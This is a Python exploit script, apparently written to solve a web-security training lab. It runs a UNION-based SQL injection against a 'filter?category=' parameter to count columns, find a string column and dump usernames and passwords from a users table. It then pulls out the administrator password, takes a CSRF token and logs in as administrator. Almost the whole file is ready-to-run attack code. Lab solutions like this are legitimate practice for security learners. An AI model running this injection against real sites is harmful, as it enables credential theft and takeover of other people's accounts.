import argparse
import urllib3
import time
import logging

import requests
from bs4 import BeautifulSoup


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

HEADERS = {
    "X-Pwnfox-Color":"magenta"
}

PROXIES = {
    "http": "127.0.0.1:8080",
    "https":"127.0.0.1:8080"
}

TABLE="users"
COLUMN1="username"
COLUMN2="password"


log = logging.getLogger(__name__)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def num_cols(url,no_proxy):

    if not no_proxy:
        i = 1
        while True:
            r = requests.get(url+f"filter?category=G' order by {i}--",headers=HEADERS,proxies=PROXIES,verify=False)
            if r.status_code == 500:
                return i-1
            i+=1
    else:
        i = 1
        while True:
            r = requests.get(url+f"filter?category=G' order by {i}--",headers=HEADERS)
            if r.status_code == 500:
                return i-1
            i+=1



def extract_pass(html):

    soup = BeautifulSoup(html,"html.parser")

    th = soup.find("th", string=lambda x: x and x.startswith("administrator~~~"))
    password = th.text.split("~~~", 1)[1]

    return password

def extract_csrf(html):
    soup = BeautifulSoup(html, "html.parser")

    csrf_input = soup.find("input", attrs={"name": "csrf"})

    if not csrf_input:
        print("[!] CSRF input not found. Dumping HTML snippet:\n")
        exit(1)

    return csrf_input.get("value")

def check_string_col(url,no_proxy):

    null='null'
    for i in range(1,3):
        x,y="null","null"

        if i == 1:
            x = f"'{null}'"
        if i == 2:
            y = f"'{null}'"
        if not no_proxy:
            log.info("sending payload for checking null")
            r = requests.get(url+f"filter?category=G' union select {x},{y} -- ",headers=HEADERS,proxies=PROXIES,verify=False)
            if r.status_code == 200:
                return i
        else:
            r = requests.get(url+f"filter?category=G' union select {x},{y} -- ",headers=HEADERS)
            if r.status_code == 200:
                return i



def exploit(url:str, no_proxy:bool):

    password = ""

    cols = num_cols(url,no_proxy)
    log.info(f"[+] found number of columns: {cols}")

    str_col = check_string_col(url,no_proxy)

    if str_col == 1:
        if not no_proxy:
            r = requests.get(url+f"filter?category=G' union select {COLUMN1} || '~~~' ||{COLUMN2}, null from {TABLE} -- ",headers=HEADERS,proxies=PROXIES,verify=False)
        else:
            r = requests.get(url+f"filter?category=G' union select {COLUMN1} || '~~~' ||{COLUMN2}, null from {TABLE} -- ",headers=HEADERS)

        password = extract_pass(r.text)

        log.info(f"[+] found adminstrator password: {password}")

    if str_col == 2:
        if not no_proxy:
            r = requests.get(url+f"filter?category=G' union select null,{COLUMN1} || '~~~' ||{COLUMN2} from {TABLE} -- ",headers=HEADERS,proxies=PROXIES,verify=False)
        else:
            r = requests.get(url+f"filter?category=G' union select null,{COLUMN1} || '~~~' ||{COLUMN2} from {TABLE} -- ",headers=HEADERS)


        password = extract_pass(r.text)

        log.info(f"[+] found adminstrator password: {password}")

    session = requests.Session()


    if not no_proxy:
        session.proxies.update(PROXIES)

    session.verify = False

    session.headers.update(HEADERS)

    log.info("sending a GET request to recieve CSRF token")

    resp = session.get(url+"login")

    csrf = extract_csrf(resp.text)
    log.info(f"csrf token extracted: {csrf}")

    payload = {
        "csrf": csrf,
        "username":"administrator",
        "password": password
    }


    resp = session.post(url+"login",data=payload,allow_redirects=False)

    if resp.status_code == 302:
        time.sleep(2)
        r = session.get(url)

        if "Congratulations, you solved the lab!" in r.text:
             log.info("✅ SQLi login bypass confirmed")
        else:
            log.info("probing again...")
            time.sleep(2)
            r = session.get(url)
            if "Congratulations, you solved the lab!" in r.text:
                 log.info("✅ SQLi login bypass confirmed")
            else:
                log.info("❌ bypass failed!")






def parse():
    parser = argparse.ArgumentParser()
    parser.add_argument("-n", "--no-proxy", help="to not use any proxy", default=False, action="store_true")
    parser.add_argument("url", help="vulnerable url")
    return parser.parse_args()

def normalize_url(url: str):
    if not url.endswith("/"):
        url = url + "/"
        return url
    return url

if __name__ == "__main__":
    args = parse()
    exploit(normalize_url(args.url),args.no_proxy)
